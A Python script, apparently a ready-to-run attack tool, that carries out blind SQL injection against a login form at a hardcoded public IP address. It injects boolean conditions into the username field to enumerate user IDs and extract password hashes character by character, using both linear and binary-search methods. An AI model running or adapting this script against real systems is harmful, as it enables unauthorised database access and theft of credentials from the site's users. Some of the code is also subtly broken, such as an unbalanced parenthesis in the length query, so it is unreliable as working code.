#!/bin/python3

import requests

# keeps track of queries performed against sql db
total_queries = 0
# 0-9 and a-f since data is in the form of hashsums
charset = "0123456789abcdef"
# target address (change to suit your needs)
#target = "http://127.0.0.1:5000"
target = "http://8.9.5.27:80"
# this determines victory case
needle = "Welcome back"

# takes payload as input for blind SQL injection (will need to check if needle is in response for success/fail)
def injected_query(payload):
    global total_queries
    r = requests.post(target, data={"username" : "admin' and {}--".format(payload), "password" : "password"})
    total_queries += 1
    return needle.encode() not in r.content

# creates a boolean query to determine characters validity
def boolean_query(offset, user_id, character, operator=">"):
    payload = "(select hex(substr(password,{},1)) from user where id = {}) {} hex('{}')".format(offset+1, user_id, operator, character)
    return injected_query(payload)

# determines if a user ID is valid
def invalid_user(user_id):
    payload = "(select id from user where id = {}) >= 0".format(user_id)
    return injected_query(payload)

# understand length of user's password hash
def password_length(user_id):
    i = 0
    while True:
        payload = "(select length(password) from user where id = {} and length(password) <= {} limit 1".format(user_id, i)
        if not injected_query(payload):
            return i
        i += 1

# builds a password based of inputs
def extract_hash(charset, user_id, password_length):
    found = ""
    for i in range(0, password_length):
        for j in range(len(charset)):
            if boolean_query(i, user_id, charset[j]):
                found += charset[j]
                break
    return found

# binary search hash extract
def extract_hash_bst(charset, user_id, password_length):
    found = ""
    for index in range(0, password_length):
        start = 0
        end = len(charset) - 1
        while start <= end:
            if end - start == 1: #exhausted search space
                if start == 0 and boolean_query(index, user_id, charset[start]):
                    found += charset[start]
                else:
                    found += charset[start + 1]
                break
            else: # create new middle point for charset
                middle = (start + end) // 2
                if boolean_query(index, user_id, charset[middle]):
                    end = middle
                else:
                    start = middle
    return found

# records queries taken in total (useful for debugging and logging)
def total_queries_taken():
    global total_queries
    print("\t\t[!] {} total queries.".format(total_queries))
    total_queries = 0

# looping try-catch block for integrating all of the former
while True:
    try:
        user_id = input("> Enter a user ID to extract the password hash: ")
        if not invalid_user(user_id):
            user_password_length = password_length(user_id)
            print("\t[-] User {} hash length: {}".format(user_id, user_password_length))
            total_queries_taken()
            print("\t[-] User {} hash: {}".format(user_id, extract_hash(charset, int(user_id), user_password_length)))
            total_queries_taken()
            print("\t[X] User {} hash: {}".format(user_id, extract_hash_bst(charset, int(user_id), user_password_length)))
            total_queries_taken()
        else:
            print("\t[X] User {} does not exist.".format(user_id))
    except KeyboardInterrupt:
        break
